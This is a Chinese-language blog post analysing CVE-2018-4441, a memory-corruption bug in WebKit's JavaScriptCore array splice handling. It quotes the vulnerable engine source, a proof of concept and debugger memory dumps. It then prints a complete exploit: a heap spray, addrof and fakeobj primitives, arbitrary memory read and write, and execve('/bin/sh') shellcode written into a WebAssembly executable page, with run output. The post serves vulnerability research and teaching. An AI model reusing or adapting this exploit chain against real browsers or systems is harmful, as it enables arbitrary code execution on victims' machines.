<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2018-4441）Webkit shiftCountWithArrayStorage一、漏洞简介WebKit是AppleSafari浏览器中的Web浏览器引擎，也是其他macOS、iOS和Linux系统中应用的浏览器引擎。2018年12月，该漏洞在公开披露后，被发现影响最新版本的苹果Safari浏览器。 二、漏洞影响三、复现过程漏洞分析环境配置这里我用了补丁的前一个版本 commit2">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Webkit/%EF%BC%88CVE-2018-4441%EF%BC%89Webkit%20shiftCountWithArrayStorage/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2018-4441）Webkit shiftCountWithArrayStorage一、漏洞简介WebKit是AppleSafari浏览器中的Web浏览器引擎，也是其他macOS、iOS和Linux系统中应用的浏览器引擎。2018年12月，该漏洞在公开披露后，被发现影响最新版本的苹果Safari浏览器。 二、漏洞影响三、复现过程漏洞分析环境配置这里我用了补丁的前一个版本 commit2">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:26:06.561Z">
<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Webkit/（CVE-2018-4441）Webkit shiftCountWithArrayStorage" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Webkit/%EF%BC%88CVE-2018-4441%EF%BC%89Webkit%20shiftCountWithArrayStorage/" class="article-date">
  <time datetime="2022-07-08T06:26:06.561Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-4441）Webkit-shiftCountWithArrayStorage"><a href="#（CVE-2018-4441）Webkit-shiftCountWithArrayStorage" class="headerlink" title="（CVE-2018-4441）Webkit shiftCountWithArrayStorage"></a>（CVE-2018-4441）Webkit shiftCountWithArrayStorage</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>WebKit是Apple<br>Safari浏览器中的Web浏览器引擎，也是其他macOS、iOS和Linux系统中应用的浏览器引擎。2018年12月，该漏洞在公开披露后，被发现影响最新版本的苹果Safari浏览器。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>这里我用了补丁的前一个版本 commit<br><code>21687be235d506b9712e83c1e6d8e0231cc9adfd</code> , 在 ubuntu 1804<br>下编译，环境相关的文件都放在了<a target="_blank" rel="noopener" href="https://github.com/rtfingc/cve-repo/tree/master/0x05-lokihardt-webkit-cve-2018-4441-shiftCountWithArrayStorage">这里</a></p>
<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>漏洞发生在<code>JSArray::shiftCountWithArrayStorage</code> 这个函数，根据lokihardt<br>的描述，除非对象的prototype 有indexed accessors 或者<br>proxy对象(我也不清楚是什么:( ),<br>否则调用到这个函数的时候<code>holesMustForwardToPrototype</code> 都会返回<code>false</code>,<br>本来带holes 的对象就可以进入下面的处理逻辑(总的来说就是代码写错了)</p>
<pre><code>bool JSArray::shiftCountWithArrayStorage(VM&amp; vm, unsigned startIndex, unsigned count, ArrayStorage* storage)
&#123;
    unsigned oldLength = storage-&gt;length();
    RELEASE_ASSERT(count &lt;= oldLength);

    // If the array contains holes or is otherwise in an abnormal state,
    // use the generic algorithm in ArrayPrototype.
    if ((storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)) 
        || hasSparseMap() 
        || shouldUseSlowPut(indexingType())) &#123;
        return false;
    &#125;

    if (!oldLength)
        return true;

    unsigned length = oldLength - count;

    storage-&gt;m_numValuesInVector -= count;
    storage-&gt;setLength(length);
//.....
bool Structure::holesMustForwardToPrototype(VM&amp; vm, JSObject* base) const
&#123;
    ASSERT(base-&gt;structure(vm) == this);

    if (this-&gt;mayInterceptIndexedAccesses())
        return true;

    JSValue prototype = this-&gt;storedPrototype(base);//
    if (!prototype.isObject())
        return false;
    JSObject* object = asObject(prototype);

    while (true) &#123;
        Structure&amp; structure = *object-&gt;structure(vm);
        if (hasIndexedProperties(object-&gt;indexingType()) || structure.mayInterceptIndexedAccesses())
            return true;
        prototype = structure.storedPrototype(object);
        if (!prototype.isObject())
            return false;
        object = asObject(prototype);
</code></pre>
<h4 id="poc-分析"><a href="#poc-分析" class="headerlink" title="poc 分析"></a>poc 分析</h4><pre><code>function main() &#123;
    let arr = [1];

    arr.length = 0x100000;
    arr.splice(0, 0x11);

    arr.length = 0xfffffff0;
    arr.splice(0xfffffff0, 0, 1);
&#125;

main();
</code></pre>
<p><code>lokihardt</code> 给出了poc</p>
<pre><code>./jsc
&gt;&gt;&gt; a=[1]
1
&gt;&gt;&gt; describe(a)
Object: 0x7fffaf6b4340 with butterfly 0x7fe0000e4008 (Structure 0x7fffaf6f2a00:[Array, &#123;&#125;, ArrayWithInt32, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 97
&gt;&gt;&gt; a.length=0x100000
1048576
&gt;&gt;&gt; describe(a)
Object: 0x7fffaf6b4340 with butterfly 0x7fe0000f8448 (Structure 0x7fffaf6f2b50:[Array, &#123;&#125;, ArrayWithArrayStorage, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 100
&gt;&gt;&gt; a.splice(0,0x11)
1,,,,,,,,,,,,,,,,
</code></pre>
<p>首先创建了一个 <code>ArrayWithInt32</code> 类型的array, length 改成<code>0x100000</code><br>之后会转换成<code>ArrayWithArrayStorage</code>, 然后调用 <code>splice</code><br>函数，实现在<code>Source/JavaScriptCore/runtime/ArrayPrototype.cpp:1005</code><br>的<code>arrayProtoFuncSplice</code> 函数</p>
<p>splice 用来删除修改array, 如 <code>a.splice(0, 0x11)</code>, 就表示从<code>index=0</code><br>开始删除0x11 项， 第三个参数表示要替换的内容， 如<code>a.splice(0,0x11,1,1)</code><br>表示删除 0x11 个项，然后添加两个项，内容都是1,<br>也可以这<code>a.splice(0,1,1,2,3)</code><br>要添加的项比删除多的时候会重新分配内存。我们看一下函数具体是怎么样实现的，<br>这里用poc 的 <code>a.length=0x100000; a.splice(0,0x11)</code> 为例</p>
<pre><code>EncodedJSValue JSC_HOST_CALL arrayProtoFuncSplice(ExecState* exec)
&#123;
    // 15.4.4.12

    VM&amp; vm = exec-&gt;vm();
    auto scope = DECLARE_THROW_SCOPE(vm);

    JSObject* thisObj = exec-&gt;thisValue().toThis(exec, StrictMode).toObject(exec);
    EXCEPTION_ASSERT(!!scope.exception() == !thisObj);
    if (UNLIKELY(!thisObj))
        return encodedJSValue();
    // length = 0x100000
    unsigned length = toLength(exec, thisObj);
    RETURN_IF_EXCEPTION(scope, encodedJSValue());

    if (!exec-&gt;argumentCount()) &#123;
//..
    &#125;
    // splice 第一个参数， 这里是 0
    unsigned actualStart = argumentClampedIndexFromStartOrEnd(exec, 0, length);
    RETURN_IF_EXCEPTION(scope, encodedJSValue());
    // actualDeleteCount = 0x100000 - 0
    unsigned actualDeleteCount = length - actualStart;
    // argumentCount == 2, 进入判断， actualDeleteCount = 0x11
    if (exec-&gt;argumentCount() &gt; 1) &#123;
        double deleteCount = exec-&gt;uncheckedArgument(1).toInteger(exec);
        RETURN_IF_EXCEPTION(scope, encodedJSValue());
        if (deleteCount &lt; 0)
            actualDeleteCount = 0;
        else if (deleteCount &gt; length - actualStart)
            actualDeleteCount = length - actualStart;
        else
            actualDeleteCount = static_cast&lt;unsigned&gt;(deleteCount);
    &#125;
//...
    // itemCount 表示要添加的 item 数量， 这里是 0 &lt; 0x11 --&gt; 调用 shift
    unsigned itemCount = std::max&lt;int&gt;(exec-&gt;argumentCount() - 2, 0);
    if (itemCount &lt; actualDeleteCount) &#123;
        shift&lt;JSArray::ShiftCountForSplice&gt;(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);
        RETURN_IF_EXCEPTION(scope, encodedJSValue());
    &#125; else if (itemCount &gt; actualDeleteCount) &#123;
        unshift&lt;JSArray::ShiftCountForSplice&gt;(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);
        RETURN_IF_EXCEPTION(scope, encodedJSValue());
    &#125;
    // 把每个添加的item 内容写入
    for (unsigned k = 0; k &lt; itemCount; ++k) &#123;
        thisObj-&gt;putByIndexInline(exec, k + actualStart, exec-&gt;uncheckedArgument(k + 2), true);
        RETURN_IF_EXCEPTION(scope, encodedJSValue());
    &#125;
 // 重新设置长度   
    scope.release();
    setLength(exec, vm, thisObj, length - actualDeleteCount + itemCount);
    return JSValue::encode(result);
&#125;
</code></pre>
<p>整理一下</p>
<ul>
<li><p>  <code>actualStart</code> 第一个参数，表示要开始delete 的地方</p>
</li>
<li><p><code>actualDeleteCount</code> 第二个参数，要delete<br>  的数量，没有设置时默认是<code>length - actualStart</code></p>
</li>
<li><p>  itemCount</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>第三个参数开始的数量</p>
<ul>
<li>  <code>itemCount &lt; actualDeleteCount</code> 会调用 shift</li>
<li>  <code>itemCount &gt; actualDeleteCount</code> 调用 unshift</li>
</ul>
</li>
</ul>
<p>我们跟一下<code>shift</code></p>
<pre><code>template&lt;JSArray::ShiftCountMode shiftCountMode&gt;
void shift(ExecState* exec, JSObject* thisObj, unsigned header, unsigned currentCount, unsigned resultCount, unsigned length)
&#123;
    VM&amp; vm = exec-&gt;vm();
    auto scope = DECLARE_THROW_SCOPE(vm);

    RELEASE_ASSERT(currentCount &gt; resultCount);
    // 要多 delete 的数量
    unsigned count = currentCount - resultCount;

    RELEASE_ASSERT(header &lt;= length);
    RELEASE_ASSERT(currentCount &lt;= (length - header));

    if (isJSArray(thisObj)) &#123;
        JSArray* array = asArray(thisObj);
        if (array-&gt;length() == length &amp;&amp; array-&gt;shiftCount&lt;shiftCountMode&gt;(exec, header, count))
            return;
    &#125;

    for (unsigned k = header; k &lt; length - currentCount; ++k) &#123;
        unsigned from = k + currentCount;
        unsigned to = k + resultCount;
        JSValue value = getProperty(exec, thisObj, from);
        RETURN_IF_EXCEPTION(scope, void());
        if (value) &#123;
            thisObj-&gt;putByIndexInline(exec, to, value, true);
            RETURN_IF_EXCEPTION(scope, void());
        &#125; else &#123;
            bool success = thisObj-&gt;methodTable(vm)-&gt;deletePropertyByIndex(thisObj, exec, to);
            RETURN_IF_EXCEPTION(scope, void());
            if (!success) &#123;
                throwTypeError(exec, scope, UnableToDeletePropertyError);
                return;
            &#125;
        &#125;
    &#125;
    for (unsigned k = length; k &gt; length - count; --k) &#123;
        // 
        bool success = thisObj-&gt;methodTable(vm)-&gt;deletePropertyByIndex(thisObj, exec, k - 1);
        RETURN_IF_EXCEPTION(scope, void());
        if (!success) &#123;
            throwTypeError(exec, scope, UnableToDeletePropertyError);
            return;
        &#125;
    &#125;
&#125;
JSArray::ShiftCountForSplice` 实现在`Source/JavaScriptCore/runtime/JSArray.h:125`, `shiftCountWithAnyIndexingType` 根据 array 的类型做不同的处理，这里我们是`ArrayWithArrayStorage`, 直接调用`shiftCountWithArrayStorage
bool shiftCountForSplice(ExecState* exec, unsigned&amp; startIndex, unsigned count)        
&#123;                                                                                      
    return shiftCountWithAnyIndexingType(exec, startIndex, count);                     
&#125;                                                                                      
//.................

bool JSArray::shiftCountWithAnyIndexingType(ExecState* exec, unsigned&amp; startIndex, unsigned count)
&#123;
    VM&amp; vm = exec-&gt;vm();
    RELEASE_ASSERT(count &gt; 0);

    ensureWritable(vm);

    Butterfly* butterfly = this-&gt;butterfly();

    switch (indexingType()) &#123;
    case ArrayClass:
        return true;

    case ArrayWithUndecided:
        // Don&#39;t handle this because it&#39;s confusing and it shouldn&#39;t come up.
        return false;

    case ArrayWithInt32:
    case ArrayWithContiguous: &#123;
        unsigned oldLength = butterfly-&gt;publicLength();
    //...
        return true;
    &#125;

    case ArrayWithDouble: &#123;
        unsigned oldLength = butterfly-&gt;publicLength();
        RELEASE_ASSERT(count &lt;= oldLength);
        //...
        return true;
    &#125;

    case ArrayWithArrayStorage:
    case ArrayWithSlowPutArrayStorage:
        return shiftCountWithArrayStorage(vm, startIndex, count, arrayStorage());

    default:
        CRASH();
        return false;
    &#125;
&#125;
</code></pre>
<p>这里就是漏洞点了，前面提到<code>holesMustForwardToPrototype</code> 会返回false,<br>这样就会进入到后面的逻辑</p>
<pre><code>bool JSArray::shiftCountWithArrayStorage(VM&amp; vm, unsigned startIndex, unsigned count, ArrayStorage* storage)
&#123;
    unsigned oldLength = storage-&gt;length();
    RELEASE_ASSERT(count &lt;= oldLength);

    // If the array contains holes or is otherwise in an abnormal state,
    // use the generic algorithm in ArrayPrototype.
    if ((storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)) 
        || hasSparseMap() 
        || shouldUseSlowPut(indexingType())) &#123;
        return false;
    &#125;

    if (!oldLength)
        return true;
    //count = 0x11, oldlength = 0x100000, length = 0xfffef
    unsigned length = oldLength - count;
    // m_numValuesInVector = 1, 计算之后 m_numValuesInVector = 0xfffffff0
    storage-&gt;m_numValuesInVector -= count;
    storage-&gt;setLength(length);
</code></pre>
<p>这里运行结束后<code>a.length = 0xfffef</code>,<br><code>storage.m_numValuesInVector = 0xfffffff0</code>, 然后 poc<br>下一步设置<code>a.length = 0xfffffff0</code>, 这样就有<br><code>a.length == storage.m_numValuesInVector</code>, 这样<code>hasHoles</code><br>后续都会返回false</p>
<pre><code>bool hasHoles() const                         
&#123;                                             
    return m_numValuesInVector != length();   
&#125;
</code></pre>
<p>最后一步<code>a.splice(0xfffffff0, 0, 1);</code>,<br><code>itemCount == 1 &gt; actualDeleteCount == 0</code>, 于是就会进入 <code>unshift</code> 函数，<br>和 shift 函数类似，这里最终会进入 <code>JSArray</code><br>的<code>unshiftCountWithArrayStorage</code></p>
<p>因为 <code>storage-&gt;hasHoles()</code> 返回的是 false,<br>所以可以进入后面的判断，要添加的item 比<br>delete的多，那么就需要扩大原来的内存，后续的内存操作会出现问题，最终<code>segmentfault</code></p>
<pre><code>bool JSArray::unshiftCountWithArrayStorage(ExecState* exec, unsigned startIndex, unsigned count, ArrayStorage* storage)
&#123;
//..

    // If the array contains holes or is otherwise in an abnormal state,
    // use the generic algorithm in ArrayPrototype.
    if (storage-&gt;hasHoles() || storage-&gt;inSparseMode() || shouldUseSlowPut(indexingType()))
        return false;

    bool moveFront = !startIndex || startIndex &lt; length / 2;

    unsigned vectorLength = storage-&gt;vectorLength();

    // Need to have GC deferred around the unshiftCountSlowCase(), since that leaves the butterfly in
    // a weird state: some parts of it will be left uninitialized, which we will fill in here.
    DeferGC deferGC(vm.heap);
    auto locker = holdLock(cellLock());

    if (moveFront &amp;&amp; storage-&gt;m_indexBias &gt;= count) &#123;
        Butterfly* newButterfly = storage-&gt;butterfly()-&gt;unshift(structure(vm), count);
        storage = newButterfly-&gt;arrayStorage();
        storage-&gt;m_indexBias -= count;
        storage-&gt;setVectorLength(vectorLength + count);
        setButterfly(vm, newButterfly);
    &#125; else if (!moveFront &amp;&amp; vectorLength - length &gt;= count)
        storage = storage-&gt;butterfly()-&gt;arrayStorage();
    else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count))
        storage = arrayStorage();// 0x60 
    else &#123;
        throwOutOfMemoryError(exec, scope);
        return true;
    &#125;

    WriteBarrier&lt;Unknown&gt;* vector = storage-&gt;m_vector;

    if (startIndex) &#123;
        if (moveFront)
            memmove(vector, vector + count, startIndex * sizeof(JSValue));
        else if (length - startIndex)
            memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue));
    &#125;

    for (unsigned i = 0; i &lt; count; i++)
        vector[i + startIndex].clear();

    return true;
&#125;
</code></pre>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>okay， 漏洞发生的原因大概清楚了，我们再来看看要怎么样利用。我们可以发现<br><code>unshiftCountWithArrayStorage</code> 有一个 <code>memmove</code> 的操作，<br>假如执行<code>a.splice(0x1000,0,1)</code>, <code>startIndex == 0x1000</code>,<br><code>moveFront == true</code> , <code>count = 1</code></p>
<pre><code>if (startIndex) &#123;
        if (moveFront)
            memmove(vector, vector + count, startIndex * sizeof(JSValue));
        else if (length - startIndex)
            memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue));
    &#125;
</code></pre>
<p>vector 来自前面的<code>storage</code> , 这里会进入 <code>storage = arrayStorage();</code><br>重新初始化一个 storage,<br>可以跟踪一下<code>Source/JavaScriptCore/runtime/ButterflyInlines.h:77</code><br>的<code>Butterfly::tryCreateUninitialized</code> 函数，最终分配的内存大小是<br>0x60(0x58 向上对齐)。但是 因为这里<code>startIndex</code><br>可以控制，于是这里就可以越界做内存拷贝。</p>
<pre><code>if (moveFront &amp;&amp; storage-&gt;m_indexBias &gt;= count) &#123;//m_indexBias ==0 &lt; count ==1
        Butterfly* newButterfly = storage-&gt;butterfly()-&gt;unshift(structure(vm), count);
        storage = newButterfly-&gt;arrayStorage();
        storage-&gt;m_indexBias -= count;
        storage-&gt;setVectorLength(vectorLength + count);
        setButterfly(vm, newButterfly);
    &#125; else if (!moveFront &amp;&amp; vectorLength - length &gt;= count)// moveFront == true
        storage = storage-&gt;butterfly()-&gt;arrayStorage();
    else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count))
        storage = arrayStorage();// 0x60 
    else &#123;
        throwOutOfMemoryError(exec, scope);
        return true;
    &#125;

    WriteBarrier&lt;Unknown&gt;* vector = storage-&gt;m_vector;
</code></pre>
<p>如果内存布局像下面这样,</p>
<pre><code>vector = 0x7fe000287a78
pwndbg&gt; x/1000gx 0x7fe000287a78
0x7fe000287a78: 0x00000000badbeef0      0x0000000000000000
0x7fe000287a88: 0x00000000badbeef0      0x00000000badbeef0
0x7fe000287a98: 0x00000000badbeef0      0x00000000badbeef0
//..
// 其他 object 的 butterfly,  length = 0xa
0x7fe000287ff8: 0x00000000badbeef0      0x0000000d0000000a
0x7fe000288008: 0x0000000000001337      0x402abd70a3d70a3d
0x7fe000288018: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
// vector + 0x1000
0x7fe000288a78: 0x0000000000000000      0x0000000d0000000a
0x7fe000288a88: 0x0000000000001337      0x402abd70a3d70a3d
</code></pre>
<p>memmove之后, 可以把其他object 的 <code>buttefly</code> 的 length<br>改了，假如可以找到这个 object， 那么就可以利用这个 object<br>来构造越界读写了。</p>
<pre><code>// vector
0x7fe000287a78: 0x0000000000000000      0x00000000badbeef0
0x7fe000287a88: 0x00000000badbeef0      0x00000000badbeef0
// 其他 object 的 butterfly,  length = 0x1337
0x7fe000287ff8: 0x0000000d0000000a      0x0000000000001337
0x7fe000288008: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
// vector + 0x1000
0x7fe000288a78: 0x0000000d0000000a      0x0000000000001337
0x7fe000288a88: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
</code></pre>
<h4 id="addrof-和-fakeobj-构造"><a href="#addrof-和-fakeobj-构造" class="headerlink" title="addrof 和 fakeobj 构造"></a>addrof 和 fakeobj 构造</h4><p>首先喷一堆的object， 尝试构造出上面提到的内存布局，length都是 10，<br>这样新分配的内存就是 <code>10 * 8 + 0x10 = 0x60</code>, 就会和新申请的<code>storage</code><br>分配在十分接近的内存上。 <code>spray[i]</code> 和 <code>spray[i+1]</code> 会连续分配</p>
<pre><code>for (let i = 0; i &lt; 0x3000; i += 2) &#123;                                                   
    spray[i]   = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i];       
    spray[i+1] = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;];  // fakeobj                              
&#125;                                                                                       
for (let i = 0; i &lt; 0x3000; i += 2)                                                     
    spray[i][0] = i2f(0x1337)
</code></pre>
<p>然后是 splice(0x1000,0,1) 触发<code>memmove</code>, 然后找出那个被改了 size 的<br>object</p>
<pre><code>arr.splice(0x1000,0,1);                      

fake_index=-1;                               
for(let i=0;i&lt;0x3000;i+=2)&#123;                  
    if(spray[i].length!=10)&#123;                 
       print(&quot;hit: &quot;+i.toString(16));       
       fake_index=i;                        
       break;                               
    &#125;                                        
&#125;   
//..spray[i] ArrayWithDouble
0x7ff000287ff8: 0x00000000badbeef0      0x0000000d0000000a
0x7ff000288008: 0x0000000000001337      0x402abd70a3d70a3d
0x7ff000288018: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
0x7ff000288028: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
0x7ff000288038: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
0x7ff000288048: 0x402abd70a3d70a3d      0x40c77caf5c28f5c3
// spray[i+1], ArrayWithContiguous
0x7ff000288058: 0x7ff8000000000000      0x7ff8000000000000
0x7ff000288068: 0x7ff8000000000000      0x0000000d0000000a
0x7ff000288078: 0x00007fffae25d240      0x00007fffae25d280
0x7ff000288088: 0x00007fffae25d2c0      0x00007fffae25d300
0x7ff000288098: 0x00007fffae25d340      0x00007fffae25d380
0x7ff0002880a8: 0x00007fffae25d3c0      0x00007fffae25d400
0x7ff0002880b8: 0x00007fffae25d440      0x00007fffae25d480
</code></pre>
<p>到了这里, <code>spray[i][14] == spray[i+1][0]</code>, 往<code>spray[i][14]</code> 写一个<br>地址， 然后从<code>spray[i+1]</code> 取出来就会认为他是一个object,<br>同样可以用<code>spray[i][14]</code> 读 object 的地址， fakeobj 和 addrof<br>的构造就十分直接啦</p>
<pre><code>unboxed = spray[fake_index];   
boxed = spray[fake_index+1];   
print(describe(unboxed))       
print(describe(boxed))         

function addrof(obj)&#123;                 
    boxed[0] = obj;                   
    return f2i(unboxed[14]);          

&#125;                                     

function fakeobj(addr)&#123;               
    unboxed[14] = i2f(addr);          
    return boxed[0];                  
&#125;
</code></pre>
<h4 id="任意地址读写-amp-写-wasm-getshell"><a href="#任意地址读写-amp-写-wasm-getshell" class="headerlink" title="任意地址读写 &amp; 写 wasm getshell"></a>任意地址读写 &amp; 写 wasm getshell</h4><p>接下来的利用基本上就都是通用套路了，改 <code>ArrayWithDouble</code> 的 butterfly<br>任意地址读写，然后找 wasm 的<code>rwx</code> 段写shellcode, 执行shellcode 完事。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>完整exp 如下</p>
<pre><code>var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) &#123;
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
&#125;

function i2f(i) &#123;
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
&#125;

function user_gc() &#123;
    for (let i = 0; i &lt; 10; i++) &#123;
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    &#125;
&#125;

let arr = [1];

arr.length = 0x100000;
arr.splice(0, 0x11);
arr.length = 0xfffffff0;

let spray = new Array(0x3000);

for (let i = 0; i &lt; 0x3000; i += 2) &#123;
    spray[i]   = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i];
    spray[i+1] = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;];
&#125;
for (let i = 0; i &lt; 0x3000; i += 2)
    spray[i][0] = i2f(0x1337)


arr.splice(0x1000,0,1);

fake_index=-1;
for(let i=0;i&lt;0x3000;i+=2)&#123;
    if(spray[i].length!=10)&#123;
        print(&quot;hit: &quot;+i.toString(16));
        fake_index=i;
        break;
    &#125;
&#125;

unboxed = spray[fake_index];
boxed = spray[fake_index+1];
print(describe(unboxed))
print(describe(boxed))


function addrof(obj)&#123;
    boxed[0] = obj;
    return f2i(unboxed[14]);

&#125;

function fakeobj(addr)&#123;
    unboxed[14] = i2f(addr);
    return boxed[0];
&#125;



victim = [1.1];
victim[0] =3.3;;
victim[&#39;prop&#39;] = 13.37;
victim[&#39;prop&#39;+1] = 13.37;
print(describe(victim))
print(addrof(victim).toString(16))

i32[0]=100;
i32[1]=0x01082107 - 0x10000;
var container=&#123;
    jscell:f64[0],
    butterfly:victim,
&#125;
print(describe(container))
container_addr = addrof(container);
hax = fakeobj(container_addr+0x10);

var unboxed2 = [1.1];
unboxed2[0] =3.3;

var boxed2 = [&#123;&#125;]

hax[1] = i2f(addrof(unboxed2))
var shared = victim[1];
hax[1] = i2f(addrof(boxed2))
victim[1] = shared;

var stage2=&#123;
    addrof: function(obj)&#123;
        boxed2[0] = obj;
        return f2i(unboxed2[0]);
    &#125;,
    fakeobj: function(addr)&#123;
        unboxed2[0] = i2f(addr);
        return boxed2[0];
    &#125;,
    read64: function(addr)&#123;
        hax[1] = i2f(addr + 0x10);
        return this.addrof(victim.prop);
    &#125;,
    write64: function(addr,data)&#123;
        hax[1] = i2f(addr+0x10);
        victim.prop = this.fakeobj(data)
    &#125;,
    write: function(addr, shellcode) &#123;
        var theAddr = addr;
        for(var i=0;i&lt;shellcode.length;i++)&#123;
            this.write64(addr+i,shellcode[i].charCodeAt())
        &#125;
    &#125;,
    pwn: function()&#123;
        var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
        var wasm_mod = new WebAssembly.Module(wasm_code);
        var wasm_instance = new WebAssembly.Instance(wasm_mod);
        var f = wasm_instance.exports.main;
        var addr_f = this.addrof(f);
        var addr_p = this.read64(addr_f + 0x40);
        var addr_shellcode = this.read64(addr_p);
        print(addr_f.toString(16))
        print(addr_p.toString(16))
        print(addr_shellcode.toString(16));
        shellcode = &quot;j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05&quot;
        this.write(addr_shellcode, shellcode);
        f();
    &#125;
&#125;

stage2.pwn()
</code></pre>
<h4 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h4><p>运行效果如下</p>
<pre><code>╰$ ./jsc exp.js
hit: 2e5e
Object: 0x7fffae2af690 with butterfly 0x7fe00028c078 (Structure 0x7fffaf6f2a70:[Array, &#123;&#125;, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 98
Object: 0x7fffae2af6a0 with butterfly 0x7fe00028c0e8 (Structure 0x7fffaf6f2ae0:[Array, &#123;&#125;, ArrayWithContiguous, Proto:0x7fffaf6c80a0]), StructureID: 99
